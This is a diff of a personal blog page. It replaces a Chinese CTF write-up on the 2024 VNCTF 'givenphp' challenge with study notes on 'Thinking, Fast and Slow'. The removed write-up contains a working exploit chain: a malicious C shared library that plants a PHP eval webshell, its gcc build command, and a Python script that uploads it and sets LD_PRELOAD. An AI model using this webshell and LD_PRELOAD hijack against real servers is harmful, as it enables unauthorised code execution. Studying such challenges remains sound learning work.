@@ -17,7 +17,7 @@
   <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)","zh-CN":"复制成功 (*^▽^*)","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ","zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
   
   <title>
-    2024 vnctf givenphp |
+    思考快与慢 |
     
     Blog|部分个人学习记录
   </title>
@@ -35,21 +35,18 @@
 
   
   
-    <meta name="description" content="2024 vnctf givenphp前置知识LD_LIBRARY_PATH  是一个linux的环境变量，当执行一个程序时，如果此程序依赖于动态链接的共享库，也就是.so文件，会先在查找LD_LIBRARY_PATH环境变量指定的目录然后是默认共享库（&#x2F;lib ,&#x2F;user&#x2F;lib）  LD_PRELOAD 在 LD_PRELOAD 中指定的文件会在动态链接器按照固">
+    <meta name="description" content="思考快与慢 两个概念：   附条件肯定：“是，但是..”，用于挽救初步理论，但为其寻找边界 附条件否定：”不是，但是…“，表示拒绝，但是某时这个理论合理   人类直觉统计并不可靠，它属于附条件否定  系统1：    快思考，无意识，即时触发  视觉错觉  记忆错觉  反复想某个事情，大脑以为真实发生过 情绪强烈时候会窄化注意力，细节偏差 被后续信息”改写“原始记忆   锚点效应：人们对一个不确定的">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2024 vnctf givenphp">
-<meta property="og:url" content="http://example.com/2024/03/08/2024-vnctf-givenphp/index.html">
+<meta property="og:title" content="思考快与慢">
+<meta property="og:url" content="http://example.com/2025/10/15/%E6%80%9D%E8%80%83%E5%BF%AB%E4%B8%8E%E6%85%A2/index.html">
 <meta property="og:site_name" content="Blog|部分个人学习记录">
-<meta property="og:description" content="2024 vnctf givenphp前置知识LD_LIBRARY_PATH  是一个linux的环境变量，当执行一个程序时，如果此程序依赖于动态链接的共享库，也就是.so文件，会先在查找LD_LIBRARY_PATH环境变量指定的目录然后是默认共享库（&#x2F;lib ,&#x2F;user&#x2F;lib）  LD_PRELOAD 在 LD_PRELOAD 中指定的文件会在动态链接器按照固">
+<meta property="og:description" content="思考快与慢 两个概念：   附条件肯定：“是，但是..”，用于挽救初步理论，但为其寻找边界 附条件否定：”不是，但是…“，表示拒绝，但是某时这个理论合理   人类直觉统计并不可靠，它属于附条件否定  系统1：    快思考，无意识，即时触发  视觉错觉  记忆错觉  反复想某个事情，大脑以为真实发生过 情绪强烈时候会窄化注意力，细节偏差 被后续信息”改写“原始记忆   锚点效应：人们对一个不确定的">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://img2.imgtp.com/2024/03/08/GlWohA07.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240043139.png">
-<meta property="article:published_time" content="2024-03-08T12:53:54.000Z">
-<meta property="article:modified_time" content="2024-04-27T15:48:54.000Z">
+<meta property="article:published_time" content="2025-10-15T04:18:08.000Z">
+<meta property="article:modified_time" content="2025-10-15T01:40:42.350Z">
 <meta property="article:author" content="hanggerui88">
-<meta property="article:tag" content="LD_LIBRARY劫持">
+<meta property="article:tag" content="思考快与慢">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img2.imgtp.com/2024/03/08/GlWohA07.png">
   
   
     <link rel="alternate" href="/atom.xml" title="Blog|部分个人学习记录" type="application/atom+xml">
@@ -194,7 +191,7 @@
           
         </picture>
         
-          <img  fetchpriority="high" src="/images/banner.webp" alt="2024 vnctf givenphp">
+          <img  fetchpriority="high" src="/images/banner.webp" alt="思考快与慢">
         
       
     
@@ -205,7 +202,7 @@
         
         
           <a href="/" id="logo">
-            <h1 data-aos="slide-up">2024 vnctf givenphp</h1>
+            <h1 data-aos="slide-up">思考快与慢</h1>
           </a>
         
       
@@ -232,7 +229,7 @@
   <h3 class="toc-title">Contents</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2024-vnctf-givenphp"><span class="toc-number">1.</span> <span class="toc-text">2024 vnctf givenphp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.2.</span> <span class="toc-text">题目</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%80%83%E5%BF%AB%E4%B8%8E%E6%85%A2"><span class="toc-number">1.</span> <span class="toc-text">思考快与慢</span></a></li></ol>
       
   </div>
 </div>
@@ -324,13 +321,13 @@
   
 </aside>
 
-          <section id="main"><article id="post-2024-vnctf-givenphp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main"><article id="post-思考快与慢" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner" data-aos="fade-up">
     <div class="article-meta">
       <div class="article-date">
   <span class="article-date-link" data-aos="zoom-in">
-    <time datetime="2024-03-08T12:53:54.000Z" itemprop="datePublished">2024-03-08</time>
-    <time style="display: none;" id="post-update-time">2024-04-27</time>
+    <time datetime="2025-10-15T04:18:08.000Z" itemprop="datePublished">2025-10-15</time>
+    <time style="display: none;" id="post-update-time">2025-10-15</time>
   </span>
 </div>
 
@@ -343,39 +340,74 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <h1 id="2024-vnctf-givenphp"><a href="#2024-vnctf-givenphp" class="headerlink" title="2024 vnctf givenphp"></a>2024 vnctf givenphp</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>LD_LIBRARY_PATH </p>
-<p>是一个linux的环境变量，当执行一个程序时，如果此程序依赖于动态链接的共享库，也就是.so文件，会先在查找LD_LIBRARY_PATH环境变量指定的目录然后是默认共享库（&#x2F;lib ,&#x2F;user&#x2F;lib）</p>
-<p> LD_PRELOAD</p>
-<p>在 <code>LD_PRELOAD</code> 中指定的文件会在动态链接器按照固定规则搜索共享库之前装载，他比 <code>LD_LIBRARY_PATH</code> 所指定的目录中的共享库还要优先 </p>
-<p>共享库（如：动态库）搜索顺序如下：</p>
-<ol>
-<li><p>LD_PRELOAD 环境变量指定的共享库路径；</p>
-</li>
-<li><p>LD_LIBRARY_PATH 环境变量指定的共享库路径；</p>
-</li>
-<li><p>-rpath 链接时指定的共享库路径；</p>
-</li>
-<li><p>&#x2F;etc&#x2F;ld.so.conf 配置文件指定的共享库路径；</p>
-</li>
-<li><p>默认共享库路径，&#x2F;usr&#x2F;lib，lib</p>
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2></li>
+        <h4 id="思考快与慢"><a href="#思考快与慢" class="headerlink" title="思考快与慢"></a>思考快与慢</h4><ol>
+<li>两个概念：</li>
 </ol>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">handleFileUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;challenge&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">waf</span>();</span><br><span class="line">    <span class="variable">$value</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">    <span class="variable">$key</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="variable">$func</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;putenv(&#x27;<span class="subst">$key</span>=<span class="subst">$value</span>&#x27;);&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$func</span>==<span class="variable">$_GET</span>[<span class="string">&#x27;guess&#x27;</span>])&#123;</span><br><span class="line">        <span class="variable">$func</span>();</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|&quot;|%|\(|\)|;|bash/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])||<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|&quot;|%|\(|\)|;|bash/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;evil input!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleFileUpload</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$uploadDirectory</span> = <span class="string">&#x27;/tmp/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件上传失败。&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fileExtension</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$newFileName</span> = <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;uploaded_file_&#x27;</span>, <span class="literal">true</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$fileExtension</span>;</span><br><span class="line">    <span class="variable">$destination</span> = <span class="variable">$uploadDirectory</span> . <span class="variable">$newFileName</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$destination</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$destination</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件移动失败。&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p> 题目有两个功能，一个是文件上传到&#x2F;tmp目录下，还有一个是环境变量修改</p>
-<p>根据本地测试，无论key和value是什么，$fun都是 <font color='red'>\x00lambda_1</font></p>
-<p><img src="https://img2.imgtp.com/2024/03/08/GlWohA07.png"></p>
-<p> 然后是LD劫持 </p>
-<p>1.c，把木马写到www目录下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">puts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *message)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; &gt; /var/www/html/shell.php&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>kail执行命令生成1.so文件</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o 1.so 1.c -nostartfiles</span><br></pre></td></tr></table></figure>
-
-<p>python 发上传包</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://6179e5b0-1ddf-43cc-8135-8796de783f38.vnctf2024.manqiu.top/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;upload&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(<span class="string">&#x27;1.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data=data,files=file)</span><br><span class="line"><span class="comment"># print(r.text)</span></span><br><span class="line"></span><br><span class="line">value = r.text[-<span class="number">45</span>:]</span><br><span class="line"></span><br><span class="line">param = &#123;</span><br><span class="line">    <span class="string">&quot;challenge&quot;</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;key&quot;</span>:<span class="string">&quot;LD_PRELOAD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>:value,</span><br><span class="line">    <span class="string">&quot;guess&quot;</span>:<span class="string">&#x27;\x00lambda_1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url,params=param)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240043139.png"></p>
+<ul>
+<li>附条件肯定：“是，但是..”，用于挽救初步理论，但为其寻找边界</li>
+<li>附条件否定：”不是，但是…“，表示拒绝，但是某时这个理论合理</li>
+</ul>
+<ol start="2">
+<li><p>人类直觉统计并不可靠，它属于附条件否定</p>
+</li>
+<li><p>系统1：</p>
+</li>
+</ol>
+<ul>
+<li><p>快思考，无意识，即时触发</p>
+</li>
+<li><p>视觉错觉</p>
+</li>
+<li><p>记忆错觉</p>
+<ul>
+<li>反复想某个事情，大脑以为真实发生过</li>
+<li>情绪强烈时候会窄化注意力，细节偏差</li>
+<li>被后续信息”改写“原始记忆</li>
+</ul>
+</li>
+<li><p>锚点效应：人们对一个不确定的数据估计时会受之前接触的任意数字的影响</p>
+</li>
+<li><p>曝光效应：熟悉了猫猫，就会喜欢猫</p>
+</li>
+<li><p>启发法：</p>
+<table>
+<thead>
+<tr>
+<th align="left">代表性启发法</th>
+<th>根据事物与典型原型的相似度快速判断其归属</th>
+<th align="left">忽视某类事件在总体中发生的<em>客观频率</em></th>
+<th align="center">认为“害羞、严谨”的史蒂夫更像是图书管理员而非农民，但因为农民的总数远多于图书管理员，所以史蒂夫是农民</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">可得性启发法</td>
+<td>根据信息在脑海中浮现的容易程度来估计事件发生的可能性</td>
+<td align="left">高估<strong>生动、戏剧性事件</strong>的发生概率，低估普通事件</td>
+<td align="center">因<strong>媒体大量报道</strong>空难，而高估飞机旅行的危险性，但其实数据表明它比汽车安全得多。</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>因果性直觉：大脑自动把片段连成故事</p>
+</li>
+<li><p>注意：使用高质量的纸，鲜亮的颜色，说话用简单的词汇，押韵-》会更让人信服</p>
+</li>
+</ul>
+<ol start="4">
+<li>系统2：</li>
+</ol>
+<ul>
+<li>心流模式就是进入系统2模式</li>
+<li>紧张的时候更多使用系统2</li>
+</ul>
+<ol start="5">
+<li>系统1和系统2：</li>
+</ol>
+<ul>
+<li>代替偏差：大脑是“认知吝啬鬼”，倾向于节省能量。用直觉反应的系统1，以避免调动耗能更高的理性系统2。</li>
+<li>系统1让人产生熟悉感，系统2依靠系统1的熟悉感做正误判断</li>
+<li>系统1存数据，系统2检索分析</li>
+<li>注意：开心的时候系统1更准确，但是系统2会更懒惰，要小心</li>
+</ul>
 
       
     </div>
@@ -389,7 +421,7 @@
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/LD-LIBRARY%E5%8A%AB%E6%8C%81/" rel="tag">LD_LIBRARY劫持</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%80%9D%E8%80%83%E5%BF%AB%E4%B8%8E%E6%85%A2/" rel="tag">思考快与慢</a></li></ul>
 
 
     </footer>
@@ -397,23 +429,23 @@
   
   <nav id="article-nav" data-aos="fade-up">
     
-      
-      <div class="article-nav-link-wrap article-nav-link-left">
-        
-          
-          
-            <img data-src="/images/banner.webp" data-sizes="auto" alt="内存马学习笔记" class="lazyload">
-          
-        
-        <a href="/2024/03/16/%E5%86%85%E5%AD%98%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"></a>
-        <div class="article-nav-caption">Newer</div>
-        <h3 class="article-nav-title">
-          
-            内存马学习笔记
-          
-        </h3>
-      </div>
     
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="习思想" class="lazyload">
+        
+      
+      <a href="/2025/10/05/%E4%B9%A0%E6%80%9D%E6%83%B3/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          习思想
+        
+      </h3>
+    </div>
     
   </nav>
 
@@ -492,7 +524,7 @@
   <h3 class="toc-title">Contents</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2024-vnctf-givenphp"><span class="toc-number">1.</span> <span class="toc-text">2024 vnctf givenphp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.2.</span> <span class="toc-text">题目</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%80%83%E5%BF%AB%E4%B8%8E%E6%85%A2"><span class="toc-number">1.</span> <span class="toc-text">思考快与慢</span></a></li></ol>
       
   </div>
 </div>
@@ -649,13 +681,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "hanggerui88",
-          title: "2024 vnctf givenphp",
-          url: "http://example.com/2024/03/08/2024-vnctf-givenphp/",
+          title: "思考快与慢",
+          url: "http://example.com/2025/10/15/%E6%80%9D%E8%80%83%E5%BF%AB%E4%B8%8E%E6%85%A2/",
           excerpt: "",
           description: "",
-          stripContent: "2024 vnctf givenphp前置知识LD_LIBRARY_PATH  是一个linux的环境变量，当执行一个程序时，如果此程序依赖于动态链接的共享库，也就是.so文件，会先在查找LD_LIBRARY_PATH环境变量指定的目录然后是默认共享库（&amp;#x2F;lib ,&amp;#x2F;user&amp;#x2F;lib）  LD_PRELOAD 在 LD_PRELOAD 中指定的文件会在动态链接器按照固定规则搜索共享库之前装载，他比 LD_LIBRARY_PATH 所指定的目录中的共享库还要优先  共",
-          date: "Fri Mar 08 2024 20:53:54 GMT+0800",
-          updated: "Sat Apr 27 2024 23:48:54 GMT+0800",
+          stripContent: "思考快与慢 两个概念：   附条件肯定：“是，但是..”，用于挽救初步理论，但为其寻找边界 附条件否定：”不是，但是…“，表示拒绝，但是某时这个理论合理   人类直觉统计并不可靠，它属于附条件否定  系统1：    快思考，无意识，即时触发  视觉错觉  记忆错觉  反复想某个事情，大脑以为真实发生过 情绪强烈时候会窄化注意力，细节偏差 被后续信息”改写“原始记忆   锚点效应：人们对一个不确定的数据估计时会受之前接触的任意数字的影响  曝光效应：熟悉了猫猫，就会喜欢猫  启发法：    代表性",
+          date: "Wed Oct 15 2025 12:18:08 GMT+0800",
+          updated: "Wed Oct 15 2025 09:40:42 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
